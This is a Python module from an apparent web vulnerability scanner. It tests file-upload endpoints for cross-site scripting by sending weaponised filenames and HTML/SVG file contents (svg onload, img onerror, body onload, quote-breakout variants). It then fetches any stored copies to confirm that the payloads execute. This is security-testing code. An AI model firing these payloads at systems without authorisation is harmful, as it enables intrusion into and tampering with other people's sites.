"""Multipart file-upload XSS probe (Phase 48).

Upload endpoints are a classic XSS carrier the text-param pipeline can
never reach: a file arrives as a multipart ``Content-Disposition`` part
and the *filename* is frequently echoed back by the app (upload summary,
file list, "saved as <name>" message) -- sometimes unencoded, sometimes
stored and later served.  Before this module the scanner only ever sent
form-encoded bodies with the file field as a plain text value, so the
entire vector was untested (pentest audit gap).

Probe strategy (Burp/ZAP upload-testing parity):

1. Send a real multipart POST with ``files={field: (name, content, type)}``
   plus the endpoint's other form fields riding along as ``data``.
2. Filenames carry the unique marker first (catches apps that echo ANY
   part of the name) and then weaponised variants whose markup would
   execute if the app echoes the name without encoding (quote breakout,
   <svg/onload>, <img onerror>).
3. Confirmation mirrors L1: ``verify_semantic`` on the response.  When the
   response also exposes a URL that embeds the marker filename (e.g.
   /uploads/<marker>.html), the URL is fetched once and checked for the
   stored payload -- a stored-XSS proof without a browser.
"""
from __future__ import annotations
import re
import secrets
from urllib.parse import urljoin

from .findings import Finding
from .stealth import marker as _stem_marker
from . import verifier

# Basename chars that trip naive server-side name cleaning (os.path.basename
# strips slashes but keeps <> quotes).  Kept as a constant so the payload
# list below reads as data, not logic.
_TXT = "text/plain"


def _name_candidates(marker: str) -> list[str]:
    """Filename candidates.  The weaponised names embed the marker INSIDE
    the payload's alert() call (verifier.mark) -- like the L1 corpus -- so
    ``verify_semantic`` can confirm the marker reached an executable
    position when the app echoes the name.  Quote-breakout variants are
    included because some servers decode the %22 that requests (urllib3)
    percent-encodes inside the Content-Disposition filename."""
    marked_svg = verifier.mark(
        "<svg/onload=alert(document.domain)>", marker)
    marked_img = verifier.mark(
        "<img src=x onerror=alert(document.domain)>", marker)
    marked_body = verifier.mark(
        "<body onload=alert(document.domain)>", marker)
    return [
        f"x{marker}.txt",              # pure marker: name-echo detection
        f"{marked_svg}.svg",           # stored SVG upload
        f"{marked_img}.txt",           # text-context img/onerror
        f"x'>{marked_svg}.html",       # single-quoted attribute breakout
        f'x">{marked_svg}.html',       # double-quoted (requests -> %22)
        f"{marked_body}.html",
    ]


def _first_url_with(text: str, marker: str) -> str | None:
    """Find an absolute-or-relative URL in ``text`` whose path embeds the
    marker filename -- e.g. ``/uploads/x{marker}.txt`` or a full href."""
    esc = re.escape(marker)
    for m in re.finditer(
            r"""["'(\s]([^"'\s()]*%s[^"'\s()]*)["')\s]""" % esc, text):
        cand = m.group(1)
        if cand.startswith(("/", "http://", "https://", "./", "../")):
            return cand
    return None


def _content_candidates(marker: str) -> list[tuple[str, bytes, str]]:
    """Weaponised file CONTENT candidates: ``(filename, content, mime)``.

    Phase 90 (P2): the filename probe above catches apps that echo the
    name; this catches apps that serve the uploaded bytes back at a
    predictable URL (``/uploads/x{marker}.html`` echoed in the upload
    response).  Each candidate embeds ``alert('{marker}')`` INSIDE the
    content so ``verify_semantic`` can confirm execution on the stored
    file, not just reflection.  The filename itself carries only the
    plain marker (the stored-URL regex keys off the marker).
    """
    svg = verifier.mark(
        '<svg xmlns="http://www.w3.org/2000/svg" '
        'onload="alert(document.domain)"><rect width="10" height="10"/>'
        '</svg>', marker)
    img = verifier.mark(
        '<img src=x onerror=alert(document.domain)>', marker)
    body = verifier.mark(
        '<html><body onload=alert(document.domain)></body></html>', marker)
    return [
        (f"x{marker}.svg", svg.encode("utf-8"), "image/svg+xml"),
        (f"x{marker}.html", img.encode("utf-8"), "text/html"),
        (f"x{marker}.html", body.encode("utf-8"), "text/html"),
    ]


def _find_stored_url(text: str, marker: str, url: str) -> str | None:
    """Return the first marker-bearing absolute URL in ``text`` (or
    ``None``).  Reuses the path-embedding regex of the filename probe so
    the two probes agree on what counts as an exposed store."""
    stored_url = _first_url_with(text, marker)
    if not stored_url:
        return None
    from urllib.parse import urljoin
    return urljoin(url, stored_url)


def probe_upload_content(requester, url: str, file_field: str,
                         data: dict | None = None,
                         params: dict | None = None,
                         headers: dict | None = None,
                         method: str = "POST") -> list[Finding]:
    """Probe one upload field with weaponised file CONTENT (Phase 90).

    The filename probe (:func:`probe_upload`) covers name-echo vectors;
    this covers the other half of the upload story -- apps that store the
    file and serve it back at a URL revealed in the upload response
    (``/uploads/<name>``).  Filename payloads are useless there when the
    app builds the path server-side, so the weapon moves into the file:
    each candidate is an HTML/SVG document whose ``onload``/``onerror``
    handler fires ``alert('<marker>')``.  If the response exposes a
    marker-bearing URL, the stored file is fetched and
    ``verify_semantic`` confirms the handler sits in an executable
    position -> ``stored_upload`` finding with
    ``context="uploaded_file_content"``.

    ``requester``/``method`` semantics match :func:`probe_upload`.
    Returns a list of confirmed Finding objects (empty when the server
    neither exposes a stored URL nor serves weaponised content).
    """
    method = (method or "POST").upper()
    data = dict(data or {})
    params = dict(params or {})
    headers = dict(headers or {})
    out: list[Finding] = []
    stem = _stem_marker("xssupc_")
    marker = f"{stem}{secrets.token_hex(2)}"

    for filename, content, mime in _content_candidates(marker):
        try:
            resp = requester.request(
                method, url, params=params or None,
                data=data or None,
                files={file_field: (filename, content, mime)},
                headers=headers or None)
        except Exception:
            continue
        text = getattr(resp, "text", "") or ""
        if not text or marker not in text:
            continue
        # The response mentions our file (by marker name).  If it exposes
        # a URL, fetch the stored bytes and check them for the payload.
        stored_url = _first_url_with(text, marker)
        if not stored_url:
            continue
        from urllib.parse import urljoin
        target = urljoin(url, stored_url)
        try:
            sresp = requester.request("GET", target)
            stext = getattr(sresp, "text", "") or ""
        except Exception:
            continue
        if marker not in stext:
            continue
        try:
            sv = verifier.verify_semantic(
                stext, marker,
                response_headers=dict(getattr(sresp, "headers", None)
                                      or {}))
        except Exception:
            sv = {"confirmed": False}
        if not sv.get("confirmed"):
            continue
        idx = stext.find(marker)
        out.append(Finding(**{
            "url": target, "method": "GET",
            "param": f"{file_field}[content]",
            "type": "stored_upload", "context": "uploaded_file_content",
            "payload": filename, "severity": "high",
            "confidence": "high",
            "detail": (sv.get("detail") or "") +
                      f" (stored file {stored_url} serves weaponised "
                      "HTML/SVG content)",
            "evidence": stext[max(0, idx - 60):idx + len(marker) + 120],
            "transform": ["uploaded_file_content", "stored"],
            "proof": {"status": getattr(sresp, "status_code", 0),
                      "method": "GET", "param": target,
                      "payload": filename,
                      "snippet": stext[max(0, idx - 40):
                                       idx + len(marker) + 200]},
        }))
        return out  # one confirmed stored-content vector is enough
    return out


def probe_upload(requester, url: str, file_field: str,
                 data: dict | None = None,
                 params: dict | None = None,
                 headers: dict | None = None,
                 method: str = "POST") -> list[Finding]:
    """Probe one upload field with weaponised filenames.

    ``requester`` is anything exposing ``request(method, url, params=...,
    data=..., files=...)`` -- the sync Requester (Phase 48 files= support)
    or a test double.  ``method`` is the verb the endpoint accepts (POST,
    or PUT/PATCH for RESTful uploads -- Phase 63).  Returns a list of
    confirmed Finding objects (empty when the endpoint is not
    upload-vulnerable).
    """
    method = (method or "POST").upper()
    data = dict(data or {})
    params = dict(params or {})
    headers = dict(headers or {})
    out: list[Finding] = []
    stem = _stem_marker("xssup_")
    content = b"xssentinel upload probe"

    marker = f"{stem}{secrets.token_hex(2)}"

    for filename in _name_candidates(marker):
        try:
            resp = requester.request(
                method, url, params=params or None,
                data=data or None,
                files={file_field: (filename, content, _TXT)},
                headers=headers or None)
        except Exception:
            continue
        text = getattr(resp, "text", "") or ""
        if not text or marker not in text:
            continue
        # 1) Immediate reflection: does the filename markup survive and sit
        #    in an executable position?  verify_semantic checks the actual
        #    response bytes around the marker.
        try:
            v = verifier.verify_semantic(
                text, marker,
                response_headers=dict(getattr(resp, "headers", None) or {}))
        except Exception:
            v = {"confirmed": False}
        idx = text.find(marker)
        evidence = text[max(0, idx - 60):idx + len(marker) + 120] \
            if idx >= 0 else ""
        if v.get("confirmed"):
            out.append(Finding(**{
                "url": url, "method": method, "param": f"{file_field}[filename]",
                "type": "upload_xss", "context": "multipart_filename",
                "payload": filename, "severity": "high",
                "confidence": "high",
                "detail": (v.get("detail") or "") +
                          f" (filename echoed in upload response)",
                "evidence": evidence,
                "transform": ["multipart_filename"],
                "proof": {"status": getattr(resp, "status_code", 0),
                          "method": "POST",
                          "param": f"{file_field}[filename]",
                          "payload": filename,
                          "snippet": evidence},
            }))
            return out  # one confirmed filename echo is enough
        # 2) Stored path: response referenced a URL containing the marker
        #    filename -> fetch it once and check for the stored payload.
        stored_url = _first_url_with(text, marker)
        if stored_url:
            target = urljoin(url, stored_url)
            try:
                sresp = requester.request("GET", target)
                stext = getattr(sresp, "text", "") or ""
                if marker in stext:
                    sv = verifier.verify_semantic(
                        stext, marker,
                        response_headers=dict(
                            getattr(sresp, "headers", None) or {}))
                    if sv.get("confirmed"):
                        out.append(Finding(**{
                            "url": target, "method": "GET",
                            "param": f"{file_field}[filename]",
                            "type": "stored_upload", "context": "uploaded_file",
                            "payload": filename, "severity": "high",
                            "confidence": "high",
                            "detail": (sv.get("detail") or "") +
                                      f" (stored file {stored_url} served "
                                      "attacker markup)",
                            "evidence": stext[max(0, stext.find(marker) - 60):
                                              stext.find(marker)
                                              + len(marker) + 120],
                            "transform": ["multipart_filename", "stored"],
                            "proof": {"status": getattr(sresp, "status_code", 0),
                                      "method": "GET", "param": target,
                                      "payload": filename,
                                      "snippet": stext[
                                          max(0, stext.find(marker) - 40):
                                          stext.find(marker) + 200]},
                        }))
                        return out
            except Exception:
                continue
    # Phase 90 (P2): filename vectors exhausted on this field -- run the
    # content-level probe (weaponised HTML/SVG bytes served back at a
    # stored URL).  Keep the two probes independent: a filename finding
    # returns earlier, a content finding is appended here.
    try:
        out.extend(probe_upload_content(
            requester, url, file_field, data=data, params=params,
            headers=headers, method=method))
    except Exception:
        # Content probe is best-effort; never abort the filename scan.
        pass
    return out
